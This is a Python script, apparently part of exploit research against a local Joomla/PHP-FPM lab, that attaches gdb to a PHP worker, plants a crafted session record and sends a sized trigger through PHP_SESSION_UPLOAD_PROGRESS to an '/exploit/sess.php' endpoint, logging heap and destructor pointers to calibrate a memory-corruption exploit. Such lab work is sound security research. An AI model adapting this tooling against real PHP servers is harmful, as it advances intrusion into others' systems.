#!/usr/bin/env python3
"""Joomla lab geometry probe: plant OOM + benign trigger of arbitrary size; log X/P/B0."""
import json
import os
import re
import signal
import subprocess
import sys
import time

JLAB = "/tmp/opencode/research/joomla_fpm_20261022T021000Z"
sys.path.insert(0, JLAB)
import tool
from tool import field, filepart

MASTER = int(open(JLAB + "/run/php-fpm.pid").read().strip())
SIZE = int(sys.argv[1], 0) if len(sys.argv) > 1 else 81920
TAG = sys.argv[2] if len(sys.argv) > 2 else "probe"


def worker():
    for d in os.listdir("/proc"):
        if not d.isdigit():
            continue
        try:
            ppid = int(open("/proc/%s/stat" % d).read().split()[3])
            cmd = open("/proc/%s/cmdline" % d, "rb").read().replace(b"\0", b" ").decode("latin1")
        except Exception:
            continue
        if ppid == MASTER and "pool joomla_lab" in cmd:
            return int(d)
    return None


def wait_worker(timeout=15):
    t = time.time()
    while time.time() - t < timeout:
        w = worker()
        if w:
            return w
        time.sleep(0.1)
    return None


def reqs(lines):
    out = {}
    for l in lines:
        m = re.match(r"\[[^]]+\] REQ(\d+) ", l)
        if not m:
            continue
        n = int(m.group(1)); d = out.setdefault(n, {})
        for key, pat in [
            ("heap", r"PHPRQ_START heap=(0x[0-9a-f]+)"),
            ("dec", r"SESSION_DECODE str=(0x[0-9a-f]+) len=(\d+)"),
            ("shutdown", r"SHUTDOWN DAT P=(0x[0-9a-f]+) last_dtor=(0x[0-9a-f]+) first_dtor=(0x[0-9a-f]+) used_slots=(-?\d+) next=(0x[0-9a-f]+) level=(\d+)"),
        ]:
            mm = re.search(pat, l)
            if mm:
                if key == "heap": d["heap"] = int(mm.group(1), 16)
                elif key == "dec": d.setdefault("decodes", []).append((int(mm.group(1), 16), int(mm.group(2))))
                elif key == "shutdown": d["shutdown"] = {"P": int(mm.group(1), 16), "last": int(mm.group(2), 16)}
    return out


def benign(total):
    L = total - 8 - len(str(total))
    while True:
        t = 8 + len(str(L)) + L
        if t == total:
            break
        L += total - t
    rec = b'x|s:%d:"' % L + b"A" * L + b'";'
    assert len(rec) == total
    return rec


w = wait_worker()
if not w:
    raise SystemExit("no worker")
open(tool.GLOG, "w").close()
gout = open(JLAB + "/logs/gdb_cal_%s.out" % TAG, "wb")
g = subprocess.Popen(["gdb", "-q", "--batch", "-x", JLAB + "/gdb/gb_measure.gdb", "-p", str(w)],
                     stdout=gout, stderr=subprocess.STDOUT, cwd=JLAB, start_new_session=True)
armed = False
for _ in range(200):
    if os.path.exists(tool.GLOG) and "armed" in open(tool.GLOG, errors="replace").read():
        armed = True; break
    time.sleep(0.1)
if not armed:
    print(open(JLAB + "/logs/gdb_cal_%s.out" % TAG, errors="replace").read()[-2000:])
    raise SystemExit("not armed")
res = {"worker": w, "size": SIZE, "armed": armed}
tool.seed(os.path.join(tool.SESS, "sess_pl1"), tool.PLANT_REC)
n0 = tool.req_count()
r = tool.post("/exploit/sess.php", [field("form", b"x")], tag="jcal_%s_plant" % TAG, timeout=60, cookie="pl1")
res["plant"] = {"status": r["status"], "head": r["body"][:120].decode("latin1")}
time.sleep(0.7)
tool.seed(os.path.join(tool.SESS, "sess_tb1"), benign(SIZE))
n1 = tool.req_count()
r = tool.post("/exploit/sess.php", [field("PHP_SESSION_UPLOAD_PROGRESS", b"x"), filepart()],
              tag="jcal_%s_trigger" % TAG, timeout=120, cookie="tb1")
res["trigger"] = {"status": r["status"], "head": r["body"][:120].decode("latin1")}
time.sleep(0.8)
try:
    os.killpg(os.getpgid(g.pid), signal.SIGTERM)
except Exception:
    pass
time.sleep(0.2)
lines = open(tool.GLOG, errors="replace").read().splitlines()
rr = reqs(lines)
res["plant_req"] = rr.get(n0 + 1)
res["trigger_req"] = rr.get(n1 + 1)
res["worker_after"] = worker()
json.dump(res, open(JLAB + "/arms/jcal_%s.json" % TAG, "w"), indent=1, default=str)
print(json.dumps(res, indent=1, default=str))
